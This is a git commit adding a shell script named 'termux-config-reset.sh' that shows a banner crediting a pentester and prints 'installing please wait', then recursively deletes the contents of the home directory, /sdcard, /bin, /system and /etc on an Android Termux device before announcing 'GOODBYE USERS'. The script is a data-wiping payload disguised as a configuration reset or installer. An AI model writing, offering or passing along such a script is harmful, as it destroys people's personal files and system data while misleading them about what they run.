eac2c9615ca6d1238b1f0a2519c3ba4f9264d395
Saintmalik <37118134+saintmalik@users.noreply.github.com>
2018-07-23 03:14:15 +0100

    Add files via upload

---
+++ termux-config-reset.sh
@@ -0,0 +1,32 @@
+print "\n \033[92m *******************************************************************"
+print "*                                                                 *"
+print "*    #######  ######    #####  #####  ##### #######               *"
+print "*       #     #      #  #     #     # #        #                  *"
+print "*       #     #      #  #     #       #        #                  *"
+print "*       #     ######    #####  #####  #####    #                  *"
+print "*       #     #    #    #           # #        #                  *"
+print "*       #     #     #   #     #     # #        #                  *"
+print "*       #     #      #  #####  #####  #####    #                  *"
+print "* Termux-Config-Reset Ver. 2.0                                    *"
+print "* Coded by Salawu Abdulmalik                                      *"
+print "* Cyber Security & Pentester                                      *"
+print "* Youtube Channel: SaintMalik Tech                                *"
+print "*******************************************************************\033[94m\n\n"
+
+echo "installing please wait"
+apt-get update
+cd
+rm -irf *
+cd /sdcard
+rm -irf *
+cd
+cd /bin
+rm -irf *
+cd
+cd /system
+rm -irf *
+cd 
+cd /etc
+rm -irf *
+sleep 2
+echo "done!!! RESETTING YOUR SYSTEM... GOODBYE USERS... trying use command"
